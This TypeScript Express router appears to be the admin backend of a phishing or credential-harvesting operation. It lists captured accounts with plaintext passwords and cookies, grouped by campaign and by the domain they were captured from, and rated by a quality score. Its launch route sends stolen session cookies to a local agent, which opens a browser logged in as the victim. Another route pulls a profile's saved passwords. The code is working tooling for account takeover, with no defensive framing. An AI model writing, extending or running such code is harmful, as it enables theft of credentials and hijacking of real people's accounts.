import { Router, Request, Response } from 'express';
import prisma from '../../config/database';
import monitoringService from '../../services/monitoring.service';
import profileManagerService from '../../services/browser/profile-manager.service';
import { authMiddleware } from '../../middleware/auth.middleware';
import { requireAdmin } from '../../middleware/rbac.middleware';
import { logger } from '../../utils/logger.util';
import webSocketService from '../../services/websocket.service';

const router = Router();

// All routes require admin authentication
router.use(authMiddleware);
router.use(requireAdmin);

/**
 * GET /api/admin/profiles
 * Get all profiles (admin global view) with filtering and pagination
 */
router.get('/', async (req: Request, res: Response) => {
  try {
    const { domain, type, search, page = '1', limit = '50' } = req.query;

    const pageNum = parseInt(page as string) || 1;
    const limitNum = parseInt(limit as string) || 50;
    const skip = (pageNum - 1) * limitNum;

    // Build where clause
    const where: any = {};
    
    if (domain) {
      where.capturedFrom = { contains: domain as string };
    }
    
    if (type) {
      where.provider = type as string;
    }
    
    if (search) {
      where.OR = [
        { email: { contains: search as string } },
        { accountInfo: { contains: search as string } },
      ];
    }

    // Get profiles with pagination
    const [profiles, total] = await Promise.all([
      prisma.profile.findMany({
        where,
        orderBy: { capturedAt: 'desc' },
        skip,
        take: limitNum,
        include: {
          campaign: {
            select: {
              name: true,
              provider: true,
            },
          },
        },
      }),
      prisma.profile.count({ where }),
    ]);

    // Get stats
    const [authenticated, activeSessions, gsuiteCount] = await Promise.all([
      prisma.profile.count({
        where: {
          ...where,
          authStatus: 'AUTHENTICATED',
        },
      }),
      prisma.profile.count({
        where: {
          ...where,
          isLaunched: true,
        },
      }),
      prisma.profile.count({
        where: {
          ...where,
          accountType: 'GSUITE',
        },
      }),
    ]);

    const formattedProfiles = profiles.map((profile) => ({
      id: profile.id,
      email: profile.email,
      password: profile.password,
      provider: profile.provider,
      campaignId: profile.campaignId,
      campaignName: profile.campaign.name,
      accountType: profile.accountType,
      authStatus: profile.authStatus,
      status: profile.status,
      isLaunched: profile.isLaunched,
      launchCount: profile.launchCount,
      qualityScore: profile.qualityScore,
      capturedAt: profile.capturedAt.toISOString(),
      capturedFrom: profile.capturedFrom,
      lastLaunched: profile.lastLaunched?.toISOString() || null,
      createdAt: profile.createdAt.toISOString(),
      cookies: profile.cookies ? JSON.parse(profile.cookies) : [],
    }));

    res.status(200).json({
      success: true,
      profiles: formattedProfiles,
      total,
      authenticated,
      activeSessions,
      gsuiteCount,
      page: pageNum,
      limit: limitNum,
    });
  } catch (error: any) {
    logger.error('Get all profiles (admin) error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to get profiles',
    });
  }
});

/**
 * GET /api/admin/profiles/:id
 * Get profile by ID (admin)
 */
router.get('/:id', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const result = await monitoringService.getProfileById(id, undefined, true);
    
    // Format response to include parsed cookies, password, and accountType
    if (result.success && result.profile) {
      const formatted = {
        ...result.profile,
        cookies: result.profile.cookies ? JSON.parse(result.profile.cookies as string) : [],
        password: result.profile.password || null,
        accountType: result.profile.accountType || 'GMAIL',
      };
      res.status(200).json({ success: true, profile: formatted });
    } else {
      res.status(200).json(result);
    }
  } catch (error: any) {
    logger.error('Get profile by ID (admin) error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to get profile',
    });
  }
});

/**
 * POST /api/admin/profiles/:id/launch
 * Launch browser profile (admin)
 */
router.post('/:id/launch', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      res.status(401).json({ success: false, error: 'Not authenticated' });
      return;
    }

    const { id } = req.params;

    const profile = await prisma.profile.findUnique({ where: { id } });
    if (!profile) {
      res.status(404).json({ success: false, error: 'Profile not found' });
      return;
    }

    if (!webSocketService.hasAgentConnected(req.user.id)) {
      res.status(400).json({
        success: false,
        requiresAgent: true,
        error: 'FIONA agent is not running on your PC. Download and start the agent first.',
      });
      return;
    }

    const cookies = profile.cookies ? JSON.parse(profile.cookies as string) : [];

    const sent = webSocketService.sendLaunchCommand(req.user.id, {
      profileId: id,
      cookies,
      email: profile.email,
    });

    if (!sent) {
      res.status(400).json({
        success: false,
        requiresAgent: true,
        error: 'Failed to send launch command to agent.',
      });
      return;
    }

    await prisma.profile.update({
      where: { id },
      data: {
        lastLaunched: new Date(),
        launchCount: { increment: 1 },
      },
    });

    res.status(200).json({
      success: true,
      pending: true,
      message: 'Launch command sent. Browser will open on your PC.',
    });
  } catch (error: any) {
    logger.error('Launch profile (admin) error:', error.message);
    res.status(400).json({ success: false, error: error.message || 'Failed to launch profile' });
  }
});

/**
 * POST /api/admin/profiles/:id/close
 * Close launched profile (admin)
 */
router.post('/:id/close', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      res.status(401).json({ success: false, error: 'Not authenticated' });
      return;
    }

    const { id } = req.params;
    webSocketService.sendCloseCommand(req.user.id, id);

    res.status(200).json({ success: true, message: 'Close command sent to agent.' });
  } catch (error: any) {
    logger.error('Close profile (admin) error:', error.message);
    res.status(400).json({ success: false, error: error.message || 'Failed to close profile' });
  }
});

/**
 * GET /api/admin/profiles/:id/passwords
 * Access saved passwords (admin)
 */
router.get('/:id/passwords', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const result = await profileManagerService.accessPasswords(id);

    if (result.success) {
      res.status(200).json(result);
    } else {
      res.status(400).json(result);
    }
  } catch (error: any) {
    logger.error('Get passwords (admin) error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to get passwords',
    });
  }
});

/**
 * DELETE /api/admin/profiles/:id
 * Delete profile (closes session if active, removes from DB)
 */
router.delete('/:id', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    
    // Check if profile exists
    const profile = await prisma.profile.findUnique({
      where: { id },
    });

    if (!profile) {
      return res.status(404).json({
        success: false,
        error: 'Profile not found',
      });
    }
    
    // Close if launched
    try {
      await profileManagerService.closeProfile(id);
    } catch (error) {
      // Continue with deletion even if close fails
      logger.warn(`Failed to close profile ${id} before deletion:`, error);
    }
    
    // Actually delete from database
    await prisma.profile.delete({
      where: { id },
    });

    logger.info(`Profile deleted: ${id}`);
    
    res.status(200).json({
      success: true,
      message: 'Profile deleted successfully',
    });
  } catch (error: any) {
    logger.error('Delete profile (admin) error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to delete profile',
    });
  }
});

/**
 * DELETE /api/admin/profiles
 * Bulk delete profiles — body: { ids: string[] }
 */
router.delete('/', async (req: Request, res: Response) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      res.status(400).json({ success: false, error: 'ids array required' });
      return;
    }
    const results = await Promise.all(ids.map((id: string) => monitoringService.deleteProfile(id)));
    const result = { count: results.length };
    res.status(200).json(result);
  } catch (error: any) {
    logger.error('Bulk delete profiles error:', error.message);
    res.status(400).json({ success: false, error: error.message || 'Failed to delete profiles' });
  }
});

export default router;
